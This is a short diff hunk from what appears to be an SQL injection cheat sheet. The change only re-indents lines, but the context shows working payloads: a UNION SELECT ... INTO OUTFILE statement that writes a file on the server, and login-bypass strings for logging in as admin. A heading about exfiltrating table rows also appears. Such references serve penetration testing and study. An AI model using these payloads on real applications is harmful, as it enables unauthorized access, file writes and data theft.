@@ -59,8 +59,8 @@ MySql injection, UNION operator
         AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' #'
 
 form to log in as admin
-	' or ( 1=1 and username='admin');
-	admin' --
+    ' or ( 1=1 and username='admin');
+    admin' --
 
 Tricks to read data
     Exfiltrate the different rows of the table. First, find the number of rows in the table:
